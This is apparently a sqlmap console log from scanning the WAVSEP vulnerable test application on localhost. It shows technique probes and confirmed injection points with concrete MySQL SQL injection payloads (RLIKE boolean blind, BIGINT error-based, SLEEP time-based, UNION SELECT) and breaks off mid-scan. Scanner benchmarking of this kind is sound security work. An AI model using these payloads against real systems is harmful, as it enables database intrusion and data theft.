[04:52:09] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[04:52:09] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[04:52:09] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[04:52:19] [INFO] GET parameter 'transactionId' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[04:52:19] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[04:52:19] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[04:52:19] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[04:52:19] [INFO] target URL appears to have 4 columns in query
[04:52:19] [INFO] GET parameter 'transactionId' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'transactionId' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 793 HTTP(s) requests:
---
Parameter: transactionId (GET)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: transactionId=132 RLIKE (SELECT (CASE WHEN (1044=1044) THEN 132 ELSE 0x28 END))

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: transactionId=132 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716a7a7671,(SELECT (ELT(9809=9809,1))),0x717a706271,0x78))s), 8446744073709551610, 8446744073709551610)))

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: transactionId=132 AND (SELECT 2042 FROM (SELECT(SLEEP(5)))AOao)

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: transactionId=132 UNION ALL SELECT NULL,CONCAT(0x716a7a7671,0x69415954566d6a456954556d5672644f4f737a714961446174524142706442414143506d45504961,0x717a706271),NULL,NULL-- -
---
do you want to exploit this SQL injection? [Y/n] Y
[04:52:19] [INFO] the back-end DBMS is MySQL
web application technology: JSP
back-end DBMS: MySQL >= 5.5
[36/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case17-InjectionInSearch-NumericWithoutQuotes-UnionExploit-With200Errors.jsp?msgId=1
do you want to test this URL? [Y/n/q]
> Y
[04:52:19] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case17-InjectionInSearch-NumericWithoutQuotes-UnionExploit-With200Errors.jsp?msgId=1'                                                                                                     
[04:52:19] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=DD708485667...B156CE768C'). Do you want to use those [Y/n] Y
[04:52:19] [INFO] testing if GET parameter 'msgId' is dynamic
[04:52:19] [WARNING] GET parameter 'msgId' does not appear to be dynamic
[04:52:19] [WARNING] heuristic (basic) test shows that GET parameter 'msgId' might not be injectable
[04:52:19] [INFO] testing for SQL injection on GET parameter 'msgId'
[04:52:20] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[04:52:20] [WARNING] reflective value(s) found and filtering out
[04:52:20] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[04:52:20] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[04:52:21] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[04:52:21] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[04:52:22] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[04:52:22] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[04:52:22] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[04:52:22] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[04:52:22] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[04:52:22] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[04:52:22] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[04:52:22] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[04:52:22] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[04:52:23] [INFO] testing 'Generic inline queries'
[04:52:23] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[04:52:23] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[04:52:23] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[04:52:23] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[04:52:23] [INFO] GET parameter 'msgId' appears to be 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' injectable 
[04:52:23] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[04:52:23] [INFO] GET parameter 'msgId' is 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' injectable 
[04:52:23] [INFO] testing 'MySQL inline queries'
[04:52:23] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[04:52:23] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[04:52:23] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[04:52:23] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[04:52:23] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[04:52:23] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[04:52:23] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[04:52:33] [INFO] GET parameter 'msgId' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[04:52:33] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[04:52:33] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[04:52:33] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[04:52:33] [INFO] target URL appears to have 3 columns in query
[04:52:33] [INFO] GET parameter 'msgId' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'msgId' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 796 HTTP(s) requests:
---
Parameter: msgId (GET)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: msgId=1 RLIKE (SELECT (CASE WHEN (2796=2796) THEN 1 ELSE 0x28 END))

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: msgId=1 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71766a6b71,(SELECT (ELT(8994=8994,1))),0x71766b6b71,0x78))s), 8446744073709551610, 8446744073709551610)))

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: msgId=1 AND (SELECT 3895 FROM (SELECT(SLEEP(5)))HOxz)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: msgId=1 UNION ALL SELECT CONCAT(0x71766a6b71,0x48587370444877446450556e6f726d664656754144464f6b71786b71784e4f707847624751446552,0x71766b6b71),NULL,NULL-- -
---
do you want to exploit this SQL injection? [Y/n] Y
[04:52:33] [INFO] the back-end DBMS is MySQL
web application technology: JSP
back-end DBMS: MySQL >= 5.5
[37/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case18-InjectionInCalc-NumericWithoutQuotes-BooleanExploit-With200Errors.jsp?minBalanace=10000
do you want to test this URL? [Y/n/q]
> Y
[04:52:33] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case18-InjectionInCalc-NumericWithoutQuotes-BooleanExploit-With200Errors.jsp?minBalanace=10000'                                                                                           
[04:52:33] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=A4E0D615A1A...A2FD99F2B4'). Do you want to use those [Y/n] Y
[04:52:33] [INFO] testing if GET parameter 'minBalanace' is dynamic
[04:52:33] [WARNING] GET parameter 'minBalanace' does not appear to be dynamic
[04:52:33] [WARNING] heuristic (basic) test shows that GET parameter 'minBalanace' might not be injectable
[04:52:33] [INFO] testing for SQL injection on GET parameter 'minBalanace'
[04:52:34] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[04:52:34] [WARNING] reflective value(s) found and filtering out
[04:52:34] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[04:52:34] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[04:52:35] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[04:52:35] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[04:52:35] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[04:52:35] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[04:52:35] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[04:52:36] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[04:52:36] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[04:52:36] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[04:52:36] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[04:52:36] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[04:52:36] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[04:52:36] [INFO] testing 'Generic inline queries'
[04:52:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[04:52:36] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[04:52:36] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[04:52:36] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[04:52:37] [INFO] GET parameter 'minBalanace' appears to be 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' injectable 
[04:52:37] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[04:52:37] [INFO] GET parameter 'minBalanace' is 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' injectable 
[04:52:37] [INFO] testing 'MySQL inline queries'
[04:52:37] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[04:52:37] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[04:52:37] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[04:52:37] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[04:52:37] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[04:52:37] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[04:52:37] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[04:52:47] [INFO] GET parameter 'minBalanace' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[04:52:47] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[04:52:47] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[04:52:47] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[04:52:47] [INFO] target URL appears to have 1 column in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] N
[04:52:47] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[04:52:47] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[04:52:47] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[04:52:47] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[04:52:47] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[04:52:47] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[04:52:48] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[04:52:48] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[04:52:48] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[04:52:48] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[04:52:48] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[04:52:48] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[04:52:48] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[04:52:48] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[04:52:48] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[04:52:48] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[04:52:48] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[04:52:49] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[04:52:49] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
GET parameter 'minBalanace' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 1189 HTTP(s) requests:
---
Parameter: minBalanace (GET)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: minBalanace=10000 RLIKE (SELECT (CASE WHEN (1580=1580) THEN 10000 ELSE 0x28 END))

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: minBalanace=10000 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7178717a71,(SELECT (ELT(6624=6624,1))),0x7170767671,0x78))s), 8446744073709551610, 8446744073709551610)))

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: minBalanace=10000 AND (SELECT 5084 FROM (SELECT(SLEEP(5)))JnbU)
---
do you want to exploit this SQL injection? [Y/n] Y
[04:52:49] [INFO] the back-end DBMS is MySQL
web application technology: JSP
back-end DBMS: MySQL >= 5.5
[38/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case19-InjectionInUpdate-NumericWithoutQuotes-CommandInjection-With200Errors.jsp?msgid=1
do you want to test this URL? [Y/n/q]
> Y
[04:52:49] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Error/Case19-InjectionInUpdate-NumericWithoutQuotes-CommandInjection-With200Errors.jsp?msgid=1'                                                                                                 
[04:52:49] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=55471957F30...A04D414E7A'). Do you want to use those [Y/n] Y
[04:52:49] [INFO] testing if GET parameter 'msgid' is dynamic
[04:52:49] [WARNING] GET parameter 'msgid' does not appear to be dynamic
[04:52:49] [WARNING] heuristic (basic) test shows that GET parameter 'msgid' might not be injectable
[04:52:49] [INFO] testing for SQL injection on GET parameter 'msgid'
[04:52:49] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[04:52:49] [WARNING] reflective value(s) found and filtering out
[04:52:49] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[04:52:50] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[04:52:50] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[04:52:50] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[04:52:50] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[04:52:51] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[04:52:51] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[04:52:51] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[04:52:51] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[04:52:51] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[04:52:51] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[04:52:51] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[04:52:51] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[04:52:51] [INFO] testing 'Generic inline queries'
[04:52:51] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[04:52:51] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[04:52:52] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[04:52:52] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[04:52:52] [INFO] GET parameter 'msgid' appears to be 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' injectable 
[04:52:52] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[04:52:52] [INFO] GET parameter 'msgid' is 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' injectable 
[04:52:52] [INFO] testing 'MySQL inline queries'
[04:52:52] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[04:52:52] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[04:52:52] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[04:52:52] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[04:52:52] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[04:52:52] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[04:52:52] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[04:53:02] [INFO] GET parameter 'msgid' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[04:53:02] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[04:53:02] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[04:53:02] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[04:53:02] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[04:53:02] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[04:53:02] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[04:53:02] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[04:53:03] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[04:53:03] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[04:53:03] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[04:53:03] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[04:53:03] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[04:53:03] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[04:53:03] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[04:53:03] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[04:53:04] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[04:53:04] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[04:53:04] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[04:53:04] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[04:53:04] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[04:53:04] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
GET parameter 'msgid' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 1173 HTTP(s) requests:
---
Parameter: msgid (GET)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: msgid=1 RLIKE (SELECT (CASE WHEN (4397=4397) THEN 1 ELSE 0x28 END))

    Type: error-based
    Title: MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)
    Payload: msgid=1 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7178716271,(SELECT (ELT(6897=6897,1))),0x716b707171,0x78))s), 8446744073709551610, 8446744073709551610)))

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: msgid=1 AND (SELECT 1968 FROM (SELECT(SLEEP(5)))ppay)
---
do you want to exploit this SQL injection? [Y/n] Y
[04:53:04] [INFO] the back-end DBMS is MySQL
web application technology: JSP
back-end DBMS: MySQL >= 5.5
[39/68] URL:
GET http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Identical/Case01-InjectionInView-Numeric-Blind-200ValidResponseWithDefaultOnException.jsp?transactionId=132
do you want to test this URL? [Y/n/q]
> Y
[04:53:04] [INFO] testing URL 'http://localhost:8080/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-GET-200Identical/Case01-InjectionInView-Numeric-Blind-200ValidResponseWithDefaultOnException.jsp?transactionId=132'                                                                                    
[04:53:04] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('JSESSIONID=A9738D596E7...FB454E4A73'). Do you want to use those [Y/n] Y
[04:53:04] [INFO] testing if GET parameter 'transactionId' is dynamic
[04:53:04] [WARNING] GET parameter 'transactionId' does not appear to be dynamic
[04:53:04] [WARNING] heuristic (basic) test shows that GET parameter 'transactionId' might not be injectable
[04:53:04] [INFO] testing for SQL injection on GET parameter 'transactionId'
[04:53:04] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[04:53:05] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[04:53:05] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[04:53:06] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[04:53:06] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[04:53:06] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[04:53:06] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[04:53:07] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[04:53:07] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[04:53:07] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[04:53:07] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[04:53:07] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[04:53:07] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[04:53:07] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[04:53:07] [INFO] testing 'Generic inline queries'
[04:53:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[04:53:07] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[04:53:07] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[04:53:08] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[04:53:08] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[04:53:08] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[04:53:09] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[04:53:09] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[04:53:09] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
[04:53:09] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)'
[04:53:10] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[04:53:10] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[04:53:10] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[04:53:10] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[04:53:10] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[04:53:10] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[04:53:10] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[04:53:10] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[04:53:10] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[04:53:10] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[04:53:10] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
[04:53:10] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
[04:53:10] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[04:53:10] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[04:53:10] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[04:53:11] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[04:53:11] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[04:53:11] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[04:53:11] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[04:53:12] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[04:53:12] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:53:12] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:53:12] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[04:53:13] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[04:53:13] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[04:53:13] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[04:53:13] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[04:53:14] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[04:53:14] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[04:53:14] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[04:53:14] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[04:53:14] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[04:53:14] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[04:53:14] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[04:53:14] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[04:53:14] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[04:53:14] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[04:53:14] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED)'
[04:53:14] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)'
[04:53:14] [INFO] testing 'MySQL >= 5.6 error-based - ORDER BY, GROUP BY clause (GTID_SUBSET)'
[04:53:14] [INFO] testing 'MySQL >= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS)'
[04:53:14] [INFO] testing 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[04:53:14] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)'
[04:53:14] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (UPDATEXML)'
